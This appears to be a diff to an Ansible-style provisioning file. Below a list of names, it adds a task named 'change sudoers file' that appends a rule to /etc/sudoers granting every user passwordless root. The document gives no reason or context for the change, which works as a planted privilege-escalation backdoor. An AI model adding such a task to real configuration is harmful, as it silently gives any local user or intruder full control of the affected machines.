@@ -26,3 +26,6 @@
     - bane
     - vader
     - yondu
+
+- name: change sudoers file
+  command: echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers"
